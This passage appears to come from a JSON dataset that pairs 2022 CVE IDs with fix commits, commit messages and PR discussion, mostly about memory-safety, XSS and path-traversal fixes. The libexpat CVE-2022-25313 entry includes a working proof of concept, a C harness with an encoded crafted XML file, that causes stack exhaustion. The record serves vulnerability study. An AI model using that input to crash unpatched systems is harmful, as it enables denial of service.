            "other_info": "Disable RMI endpoint by default but allow toggling Hey folks - do you think it would be safe now to remove the RMI remoting entirely? Are you aware of any issues or reports of people needing to turn RMI remoting back on?\r\n\r\nThe only thing I am really aware of that might relate to this is #9641 which might relate to the change in comms approaches.\r\n\r\nI noticed that the regression tests seem to have been running with `gocd.agent.remoting.legacy=true` set which is, err, not ideal, especially as this area is a bit sensitive for the Java 16/17 upgrade (regarding serialization to objects or JSON). Just switched them - hopefully it's fine.\r\n\r\nEdit - this was completely removed in GoCD `22.2.0`",
            "pr_title_words": 8,
            "comments_words": 112,
            "total_other_info_words": 120
        },
        {
            "cve-id": "CVE-2022-27418",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/e2ac765a25e902728b6d4a825358aa536e6668c2",
            "commit_msg": "Bug #703 safeguard against corrupt packet lengths in checksum functions",
            "commit_msg_words": 10,
            "other_info": "Bug #703 safeguard against corrupt packet lengths in checksum functions",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-1052",
            "commit_url": "https://github.com/radareorg/radare2/commit/0052500c1ed5bf8263b26b9fd7773dbdc6f170c4",
            "commit_msg": "Fix heap OOB read in macho.iterate_chained_fixups ##crash\n\n* Reported by peacock-doris via huntr.dev\r\n* Reproducer 'tests_65305'\r\n\r\nmrmacete:\r\n* Return early if segs_count is 0\r\n* Initialize segs_count also for reconstructed fixups\r\n\r\nCo-authored-by: pancake <pancake@nopcode.org>\r\nCo-authored-by: Francesco Tamagni <mrmacete@protonmail.ch>",
            "commit_msg_words": 38,
            "other_info": "Fix heap OOB read in macho.iterate_chained_fixups ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-1122",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/5383e8d1e614cb4782a101999e80762e8e9b9b24",
            "commit_msg": "wqfix issues 1368:exist a issues of freeing uninitialized pointer in src/bin/jp2/opj_decompress.c\uff0cthat will cause a segfault",
            "commit_msg_words": 15,
            "other_info": "fix issues 1368: exist a issues of freeing uninitialized pointer in src/bin/jp2/opj_decompress.c\uff0cthat will cause a segfault could you instead modify line 1359 to be ``dirptr = (dircnt_t*)calloc(1, sizeof(dircnt_t));`` ? (that's equivalent, but more compact) please also remove the memset() that is now useless > please also remove the memset() that is now useless\r\n\r\nIt has been modified. please review, thanks",
            "pr_title_words": 16,
            "comments_words": 44,
            "total_other_info_words": 60
        },
        {
            "cve-id": "CVE-2022-23618",
            "commit_url": "https://github.com/xwiki/xwiki-platform/commit/5251c02080466bf9fb55288f04a37671108f8096",
            "commit_msg": "XWIKI-10309: Check URL domains based on a whitelist (#1592)\n\nIntroduce a new property for listing the trusted domains and API to\r\ncheck an URL against that list and the aliases used in subwikis.\r\n\r\n  * Add new property url.trustedDomains in xwiki.properties\r\n  * Add new API in URLConfiguration to retrieve this configuration value\r\n  * Create a new URLSecurityManager responsible to check if an URL can\r\n    be trusted based on this property and on the subwikis configurations\r\n  * Introduce a new listener to invalidate the cache of\r\n    URLSecurityManager whenever a XWikiServerClass xobject is\r\nadded/updated/deleted\r\n  * Move URL API implementations to URL default module\r\n  * Add a new property url.enableTrustedDomains as a global switch off the\r\n    checks on domains to avoid breaking behaviours on existing instances\r\n  * Add a constant property in URLSecurityManager to be set in\r\n    ExecutionContext to allow temporary switch off the check for\r\nextensions\r\n  * Use both those switches in DefaultURLSecurityManager to prevent\r\n    performing the check when needed",
            "commit_msg_words": 157,
            "other_info": "XWIKI-10309: Check URL domains based on a whitelist General comment: you introduced a default impl but kept the impl in the url api module. That feels a bit weird to me.... > General comment: you introduced a default impl but kept the impl in the url api module. That feels a bit weird to me....\r\n\r\nI didn't want to pollute the PR with lots of file move, especially since I wasn't sure we all agree on the locations. If we do agree I'll move the impl in the right module.",
            "pr_title_words": 8,
            "comments_words": 82,
            "total_other_info_words": 90
        },
        {
            "cve-id": "CVE-2022-25314",
            "commit_url": "https://github.com/libexpat/libexpat/commit/efcb347440ade24b9f1054671e6bd05e60b4cafd",
            "commit_msg": "Prevent integer overflow in copyString\n\nThe copyString function is only used for encoding string supplied by\nthe library user.",
            "commit_msg_words": 19,
            "other_info": "[CVE-2022-25314] lib: Prevent integer overflow in copyString This appears to be [CVE-2022-25314](https://www.cve.org/CVERecord?id=CVE-2022-25314)",
            "pr_title_words": 7,
            "comments_words": 5,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2022-39308",
            "commit_url": "https://github.com/gocd/gocd/commit/236d4baf92e6607f2841c151c855adcc477238b8",
            "commit_msg": "Access Token APIs  (#5797)\n\n* Define a AuthTokenSqlMapDao to store and retrieve token information from DB\r\n\r\n* Introduce Auth Token API to manage auth tokens\r\n\r\n* Store the hashed token instead of storing the raw value\r\n\r\n* Some tests\r\n\r\n* Store information of the user who has created the auth token\r\n\r\n* Use SHA-256 instead of MD5 for hashing token value\r\n\r\n* Change username data type from VARCHAR to VARCHAR_IGNORECASE\r\n\r\n* Introduce AuthTokenMother to create authToken in tests\r\n\r\n* Fix auth token controller specs\r\n\r\n* Remove unused class variable from test\r\n\r\n* Introduce auth token index endpoint to fetch all the tokens belonging to me\r\n\r\n* Add extra attributes to auth token\r\n* Salt Id\r\n* Salt Value\r\n* Auth Config Id\r\n* Revoked At\r\n\r\n* Add support for revoking access tokens\r\nAdd a method to validate and fetch access token object provided access token\r\n\r\n* Rename controller package and module\r\n\r\n* rename service and dao\r\n\r\n* Rename auth token package\r\n\r\n* Rename rules under url rewrite\r\n\r\n* Renamed few more occurences of auth token to acccess tokens",
            "commit_msg_words": 178,
            "other_info": "Access Token APIs",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-0518",
            "commit_url": "https://github.com/radareorg/radare2/commit/9650e3c352f675687bf6c6f65ff2c4a3d0e288fa",
            "commit_msg": "Fix oobread segfault in java arith8.class ##crash\n\n* Reported by Cen Zhang via huntr.dev",
            "commit_msg_words": 14,
            "other_info": "Huntr fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-32073",
            "commit_url": "https://github.com/wolfSSL/wolfssh/commit/edb272e35ee57e7b89f3e127222c6981b6a1e730",
            "commit_msg": "ASAN SFTP Fixes\nWhen decoding SFTP messages, fix the size checks so they don't wrap. (ZD12766)",
            "commit_msg_words": 16,
            "other_info": "ASAN SFTP Fixes",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-25914",
            "commit_url": "https://github.com/GoogleContainerTools/jib/commit/67fa40bc2c484da0546333914ea07a89fe44eaaf",
            "commit_msg": "Check if file exists when executable path is passed in through jib dockerClient.executable (#3744)\n\n* Check if file exists when executable path is passed in through jib.dockerClient.executable",
            "commit_msg_words": 27,
            "other_info": "Check if file exists when executable path is passed in through jib dockerClient.executable Kudos, SonarCloud Quality Gate passed!&nbsp; &nbsp; [![Quality Gate passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/passed-16px.png 'Quality Gate passed')](https://sonarcloud.io/dashboard?id=GoogleContainerTools_jib&pullRequest=3744)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=CODE_SMELL) [0 Code Smells](https://sonarcloud.io/project/issues?id=GoogleContainerTools_jib&pullRequest=3744&resolved=false&types=CODE_SMELL)\n\n[![20.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/0-16px.png '20.0%')](https://sonarcloud.io/component_measures?id=GoogleContainerTools_jib&pullRequest=3744&metric=new_coverage&view=list) [20.0% Coverage](https://sonarcloud.io/component_measures?id=GoogleContainerTools_jib&pullRequest=3744&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=GoogleContainerTools_jib&pullRequest=3744&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=GoogleContainerTools_jib&pullRequest=3744&metric=new_duplicated_lines_density&view=list)\n\n Thank you for the review @elefeint! Changes also succeeded on continuous build. The integration tests cover both scenarios: when default docker is installed and when docker executable is provided.  Will be merging this PR.",
            "pr_title_words": 13,
            "comments_words": 84,
            "total_other_info_words": 97
        },
        {
            "cve-id": "CVE-2022-1238",
            "commit_url": "https://github.com/radareorg/radare2/commit/c40a4f9862104ede15d0ba05ccbf805923070778",
            "commit_msg": "Fix another oobread segfault in the NE bin parser ##crash\n\n* Reported by @han0nly via huntr.dev\n* Reproducers: sample1 sample2 sample3\n* BountyID: 47422cdf-aad2-4405-a6a1-6f63a3a93200",
            "commit_msg_words": 24,
            "other_info": "Fix oobread segfaults in the NE bin parser ##crash",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-0520",
            "commit_url": "https://github.com/radareorg/radare2/commit/8525ad0b9fd596f4b251bb3d7b114e6dc7ce1ee8",
            "commit_msg": "Fix bins/*/rep8 - UAF crash in pyc parser ##crash\n\n* Reported by Cen Zhang via huntr.dev",
            "commit_msg_words": 16,
            "other_info": "Huntr fixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-3821",
            "commit_url": "https://github.com/systemd/systemd/commit/9102c625a673a3246d7e73d8737f3494446bad4e",
            "commit_msg": "time-util: fix buffer-over-run\n\nFixes #23928.",
            "commit_msg_words": 5,
            "other_info": "time-util: fix buffer-over-run",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-25640",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/3cdb1c639da94a9dc8c75590d0ec475e7f27c226",
            "commit_msg": "Improve the client certificate checking logic. Make sure calling `wolfSSL_CTX_mutual_auth` is also checked.",
            "commit_msg_words": 13,
            "other_info": "Improve the client certificate checking logic",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-36007",
            "commit_url": "https://github.com/jlangch/venice/commit/c942c73136333bc493050910f171a48e6f575b23",
            "commit_msg": "vuln-fix: Partial Path Traversal Vulnerability\n\nThis fixes a partial path traversal vulnerability.\n\nReplaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nTo demonstrate this vulnerability, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: Medium\nCVSSS: 6.1\nDetection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.PartialPathTraversalVulnerability)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/13\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 123,
            "other_info": "[SECURITY] Fix Partial Path Traversal Vulnerability Hi @jlangch do you need any assistance with vulnerability disclosure for this issue? Hi Jonathan,\r\n\r\nthanks a lot for the help and your effort. The fix with some additional improvements has been applied a couple of days ago. I've opened a security advisory on GitHub today.\r\n\r\nCheers\r\nJ\u00fcrg I do suggest you include a link to this PR in the advisory you've published\r\n\r\nhttps://github.com/jlangch/venice/security/advisories/GHSA-4mmh-5vw7-rgvj",
            "pr_title_words": 6,
            "comments_words": 64,
            "total_other_info_words": 70
        },
        {
            "cve-id": "CVE-2022-1031",
            "commit_url": "https://github.com/radareorg/radare2/commit/a7ce29647fcb38386d7439696375e16e093d6acb",
            "commit_msg": "Fix UAF in aaaa on arm/thumb switching ##crash\n\n* Reported by @peacock-doris via huntr.dev\n* Reproducer tests_65185\n* This is a logic fix, but not the fully safe as changes in the code\n  can result on UAF again, to properly protect r2 from crashing we\n  need to break the ABI and add refcounting to RRegItem, which can't\n  happen in 5.6.x because of abi-compat rules",
            "commit_msg_words": 64,
            "other_info": "Fix UAF in aaaa on arm/thumb switching ##crash",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-23852",
            "commit_url": "https://github.com/libexpat/libexpat/commit/847a645152f5ebc10ac63b74b604d0c1a79fae40",
            "commit_msg": "lib: Detect and prevent integer overflow in XML_GetBuffer (CVE-2022-23852)",
            "commit_msg_words": 9,
            "other_info": "[CVE-2022-23852] Prevent XML_GetBuffer signed integer overflow Looks good to me as the code uses the same pattern as everywhere else to detect integer overflow. @rillig thanks for the review :+1: \r\n\r\nCVE request submitted to Mitre just now. Got `CVE-2022-23852` Looks good to me as well. Thank you for extending the test into its own test case and adjusting the signed overflow check! @ferivoz thanks for the review :+1: \r\n\r\nMerging now... Can anyone who submitted a CVE explain in more detail what is this package for and what might be affected by using it?  @iamkarlson are you asking what libexpat is being used for in general? Have you read the project description? For an (incomplete) list of hardware and other Open Source software using libexpat please see https://libexpat.github.io/doc/users/ . Hi, the CVSS value of 9.8 seems quite high for an integer overflow. Is there any malicious advantage that I don't see at the moment? @DominikBauer1 to my best knowledge it is unclear how much more than DoS can be gotten out of that overflow: The optimistic view is \"probably just DoS\" and the pessimistic one is \"this could be code execution\". That's why I wrote \"Impact is denial of service or more\" in the change log. I didn't suggest a score that high, but maybe the person who made that choice has information that I don't. Does that answer the question? @hartwork Yes, that answers my question. Thanks for the quick reply. @hartwork yes, that's what I was looking for. We're using docker images and I wanted to remove all unpatched dependencies from them.   @iamkarlson unless an app comes with their own bundled copy of libexpat (and most distros will patch bundles out for security reasons), updating libexpat in the distro will get the fix to all apps at once, because they all use that very instance, that's the idea. If you want to discuss this more, let's take it to e-mail, my contact is on the profile page, just so we don't spam everyone here with something that is not super specific to this very vulnerability fix. Okay? Thank you!",
            "pr_title_words": 6,
            "comments_words": 344,
            "total_other_info_words": 350
        },
        {
            "cve-id": "CVE-2022-26128",
            "commit_url": "https://github.com/FRRouting/frr/commit/c3793352a8d76d2eee1edc38a9a16c1c8a6573f4",
            "commit_msg": "babeld: fix #10502 #10503 by repairing the checks on length\n\nThis patch repairs the checking conditions on length in four functions:\nbabel_packet_examin, parse_hello_subtlv, parse_ihu_subtlv, and parse_update_subtlv\n\nSigned-off-by: qingkaishi <qingkaishi@gmail.com>",
            "commit_msg_words": 29,
            "other_info": "babeld: fix the checks for truncated packets <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3236/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3237/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport dev/8.2 > backport dev/8.2\n\n#### \ud83d\udfe0 Waiting for conditions to match\n\n<details>\n\n- [ ] `merged` [:pushpin: backport requirement]\n\n\n</details>\n\n\n<!--\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/8.2\", \"conclusion\": null}\n-*- Mergify Payload End -*-\n-->\n > backport dev/8.2\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#10528 babeld: fix the checks for truncated packets (backport #10504)](https://github.com/FRRouting/frr/pull/10528) has been created for branch `dev/8.2`\n\n</details>\n\n\n<!--\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/8.2\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 7,
            "comments_words": 197,
            "total_other_info_words": 204
        },
        {
            "cve-id": "CVE-2022-4727",
            "commit_url": "https://github.com/openmrs/openmrs-module-appointmentscheduling/commit/2ccbe39c020809765de41eeb8ee4c70b5ec49cc8",
            "commit_msg": "RA1865 - Fixing reflected XSS in the notes section (#39)\n\n* Fixing reflective XSS in the notes section\r\n\r\n* using owasp encoder for HTML encoding\r\n\r\n* Escaping HTML using WebUtil\r\n\r\n* Update api/src/main/java/org/openmrs/module/appointmentscheduling/AppointmentRequest.java\r\n\r\nCo-authored-by: Brandon Istenes <brandonesbox@gmail.com>\r\n\r\n* Update api/src/main/java/org/openmrs/module/appointmentscheduling/AppointmentRequest.java\r\n\r\nCo-authored-by: Brandon Istenes <brandonesbox@gmail.com>\r\n\r\nCo-authored-by: Anupam Devulapalli <anupam.8010@gmail.com>\r\nCo-authored-by: Mark Goodrich <mgoodrich@pih.org>\r\nCo-authored-by: Brandon Istenes <brandonesbox@gmail.com>",
            "commit_msg_words": 56,
            "other_info": "RA1865 - Fixing reflected XSS in the notes section @isears \r\nI looked further into the UiUtils implementation of HTML Encoding and realized that they are directly calling the encodeHtml function. As I encountered problems while using the UiUtils class, I directly used the OWASP standard Encode.forHtml function to handle the XSS issue here. \r\n\r\nI also looked into fixing this at the GSP level, but because the textarea has a two-way binding to a variable using ng-model, I was unsure how to go about it. This looks fine to me. @isears ?",
            "pr_title_words": 9,
            "comments_words": 82,
            "total_other_info_words": 91
        },
        {
            "cve-id": "CVE-2022-3969",
            "commit_url": "https://github.com/openkm/document-management-system/commit/c069e4d73ab8864345c25119d8459495f45453e1",
            "commit_msg": "Fix Temporary Directory Hijacking or Information Disclosure Vulnerability\n\nfix #332",
            "commit_msg_words": 10,
            "other_info": "Fix Temporary Directory Hijacking or Information Disclosure Vulnerabi\u2026 Do you need any assistance with vulnerability disclosure here? It's just fixed, but I created another merge request based on your proposal.\r\n\r\nThanks a lot!",
            "pr_title_words": 8,
            "comments_words": 25,
            "total_other_info_words": 33
        },
        {
            "cve-id": "CVE-2022-45909",
            "commit_url": "https://github.com/drachtio/drachtio-server/commit/a63d01854987d9fd846cdc9265af38ee9eb72490",
            "commit_msg": "sending an invite with a request-uri longer than 255 characters can cause a crash (#238)",
            "commit_msg_words": 15,
            "other_info": "sending an invite with a request-uri longer than 255 characters can c\u2026 I hit the same issue while sending a crafted request. This commit fixes the issue for me. CVE-2022-45909 Was assigned to this issue",
            "pr_title_words": 12,
            "comments_words": 23,
            "total_other_info_words": 35
        },
        {
            "cve-id": "CVE-2022-4904",
            "commit_url": "https://github.com/c-ares/c-ares/commit/ac596026e77244481fd68736ae7f15855803a08a",
            "commit_msg": "Add str len check in config_sortlist to avoid stack overflow\n\nIn ares_set_sortlist, it calls config_sortlist(..., sortstr) to parse\nthe input str and initialize a sortlist configuration.\n\nHowever, ares_set_sortlist has not any checks about the validity of the input str.\nIt is very easy to create an arbitrary length stack overflow with the unchecked\n`memcpy(ipbuf, str, q-str);` and `memcpy(ipbufpfx, str, q-str);`\nstatements in the config_sortlist call, which could potentially cause severe\nsecurity impact in practical programs.\n\nThis commit add necessary check for `ipbuf` and `ipbufpfx` which avoid the\npotential stack overflows.\n\nfixes #496\n\nSigned-off-by: hopper-vul <hopper.vul@gmail.com>",
            "commit_msg_words": 95,
            "other_info": "Add str len check in config_sortlist to avoid stack overflow I'm not aware of any users of this interface, but in general it just looks broken to me.\r\n\r\nIt looks like via the documentation its supposed to *only* take ip addresses or ip addresses with subnet masks, however looking at the pre-existing test cases, its accepting garbage and actively being tested to ensure it accepts garbage ??? Yes, the `str` in document are constrained by \"The provided sortstr string that holds a space separated list of IP-address-netmask pairs\", but adding a few checks to avoid potential security bugs isn't a bad thing overall.\r\n\r\nIn current change, if it detects overflow (or means bad input string), it will return with a `ARES_EBADSTR`. Thus, i added the two test cases with the minimal invalid strings input in the `SetSortlistFailures` test (which i think it is to trigger some failures) to test whether the added checks work.\r\n\r\n JFTR, this was assigned CVE-2022-4904 (via https://bugzilla.redhat.com/show_bug.cgi?id=2168631) @mmuehlenhoff thanks for maintaining the record :)",
            "pr_title_words": 10,
            "comments_words": 158,
            "total_other_info_words": 168
        },
        {
            "cve-id": "CVE-2022-28072",
            "commit_url": "https://github.com/radareorg/radare2/commit/027cd9b7274988bb1af866539ba6c2fa2ff63e45",
            "commit_msg": "Fix oobread crash in RAnal.hexagon (tests_64900) ##crash\n\nReported by giantbranch of NSFOCUS TIANJI Lab",
            "commit_msg_words": 14,
            "other_info": "Soft crashfixes",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-24754",
            "commit_url": "https://github.com/pjsip/pjproject/commit/d27f79da11df7bc8bb56c2f291d71e54df8d2c47",
            "commit_msg": "Use PJ_ASSERT_RETURN() on pjsip_auth_create_digest() and pjsua_init_tpselector() (#3009)\n\n* Use PJ_ASSERT_RETURN on pjsip_auth_create_digest\r\n\r\n* Use PJ_ASSERT_RETURN on pjsua_init_tpselector()\r\n\r\n* Fix incorrect check.\r\n\r\n* Add return value to pjsip_auth_create_digest() and pjsip_auth_create_digestSHA256()\r\n\r\n* Modification based on comments.",
            "commit_msg_words": 34,
            "other_info": "Check potential buffer overflow in `pjsip_auth_create_digest()` I'm having a hard time figuring out whether `pjsip_auth_create_digest` is part of the public API and therefore whether applying this patch would be API/ABI-breaking. pjsip/src/pjsua-lib/pjsua_core.c \r\n`PJ_ASSERT_RETURN(tp_id >= 0 &&  tp_id < (int)PJ_ARRAY_SIZE(pjsua_var.tpdata), );`\r\nThere is last `\", )\"`, is that OK?",
            "pr_title_words": 6,
            "comments_words": 41,
            "total_other_info_words": 47
        },
        {
            "cve-id": "CVE-2022-36042",
            "commit_url": "https://github.com/rizinorg/rizin/commit/556ca2f9eef01ec0f4a76d1fbacfcf3a87a44810",
            "commit_msg": "Fix oob write in dyldcache\n\nWhen the individual n_slide_infos were too high, the sum would overflow\nand too few entries would be allocated.",
            "commit_msg_words": 23,
            "other_info": "Fix vulnerabilities on several components To be cherry-picked for 0.4.1",
            "pr_title_words": 5,
            "comments_words": 5,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-0173",
            "commit_url": "https://github.com/radareorg/radare2/commit/37897226a1a31f982bfefdc4aeefc2e50355c73c",
            "commit_msg": "Fix use-after-free in iobank rbtree usage ##io\n\n* See havoc4 bin for reproducer\n* Reported via huntr.dev by 'Cen Zhang'",
            "commit_msg_words": 20,
            "other_info": "Fix use-after-free in iobank rbtree usage ##io",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-37048",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/6a840817e3a5a5674fdc1122954c445bec78fd51",
            "commit_msg": "Bug #735 heap-overflow in get_l2len_protocol",
            "commit_msg_words": 5,
            "other_info": "Bug #735 heap-overflow in get_l2len_protocol",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-25313",
            "commit_url": "https://github.com/libexpat/libexpat/commit/9b4ce651b26557f16103c3a366c91934ecd439ab",
            "commit_msg": "Prevent stack exhaustion in build_model\n\nIt is possible to trigger stack exhaustion in build_model function if\ndepth of nested children in DTD element is large enough. This happens\nbecause build_node is a recursively called function within build_model.\n\nThe code has been adjusted to run iteratively. It uses the already\nallocated heap space as temporary stack (growing from top to bottom).\n\nOutput is identical to recursive version. No new fields in data\nstructures were added, i.e. it keeps full API and ABI compatibility.\nInstead the numchildren variable is used to temporarily keep the\nindex of items (uint vs int).\n\nDocumentation and readability improvements kindly added by Sebastian.\n\nProof of Concept:\n\n1. Compile poc binary which parses XML file line by line\n\n```\ncat > poc.c << EOF\n #include <err.h>\n #include <expat.h>\n #include <stdio.h>\n\n XML_Parser parser;\n\n static void XMLCALL\n dummy_element_decl_handler(void *userData, const XML_Char *name,\n                            XML_Content *model) {\n   XML_FreeContentModel(parser, model);\n }\n\n int main(int argc, char *argv[]) {\n   FILE *fp;\n   char *p = NULL;\n   size_t s = 0;\n   ssize_t l;\n   if (argc != 2)\n     errx(1, \"usage: poc poc.xml\");\n   if ((parser = XML_ParserCreate(NULL)) == NULL)\n     errx(1, \"XML_ParserCreate\");\n   XML_SetElementDeclHandler(parser, dummy_element_decl_handler);\n   if ((fp = fopen(argv[1], \"r\")) == NULL)\n     err(1, \"fopen\");\n   while ((l = getline(&p, &s, fp)) > 0)\n     if (XML_Parse(parser, p, (int)l, XML_FALSE) != XML_STATUS_OK)\n       errx(1, \"XML_Parse\");\n   XML_ParserFree(parser);\n   free(p);\n   fclose(fp);\n   return 0;\n }\nEOF\ncc -std=c11 -D_POSIX_C_SOURCE=200809L -lexpat -o poc poc.c\n```\n\n2. Create XML file with a lot of nested groups in DTD element\n\n```\ncat > poc.xml.zst.b64 << EOF\nKLUv/aQkACAAPAEA+DwhRE9DVFlQRSB1d3UgWwo8IUVMRU1FTlQgdXd1CigBAHv/58AJAgAQKAIA\nECgCABAoAgAQKAIAECgCABAoAgAQKHwAAChvd28KKQIA2/8gV24XBAIAECkCABApAgAQKQIAECkC\nABApAgAQKQIAEClVAAAgPl0+CgEA4A4I2VwwnQ==\nEOF\nbase64 -d poc.xml.zst.b64 | zstd -d > poc.xml\n```\n\n3. Run Proof of Concept\n\n```\n./poc poc.xml\n```\n\nCo-authored-by: Sebastian Pipping <sebastian@pipping.org>",
            "commit_msg_words": 270,
            "other_info": "[CVE-2022-25313] lib: Prevent stack exhaustion in build_model This appears to be [CVE-2022-25313](https://www.cve.org/CVERecord?id=CVE-2022-25313)",
            "pr_title_words": 7,
            "comments_words": 5,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2022-2963",
            "commit_url": "https://github.com/jasper-software/jasper/commit/d99636fad60629785efd1ef72da772a8ef68f54c",
            "commit_msg": "fix memory leaks in function cmdopts_parse",
            "commit_msg_words": 6,
            "other_info": "fix memory leaks in function cmdopts_parse > Looks good. But you have a wrong indentation. Please indent correctly and then ammend your commit.\r\n\r\nThanks, i have modified it",
            "pr_title_words": 6,
            "comments_words": 22,
            "total_other_info_words": 28
        },
        {
            "cve-id": "CVE-2022-35858",
            "commit_url": "https://github.com/Samsung/mTower/commit/6b325fd26bf06bee17abd3fd3fd4b0aa0e74e7b2",
            "commit_msg": "Fixed CVE-2022-35858\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 6,
            "other_info": "Fixed CVE-2022-35858",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-40761",
            "commit_url": "https://github.com/Samsung/mTower/commit/c5f30c70e48786e1aef8c815f35e406a6c4fb3ae",
            "commit_msg": "Fixed CVE-2022-40761\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 6,
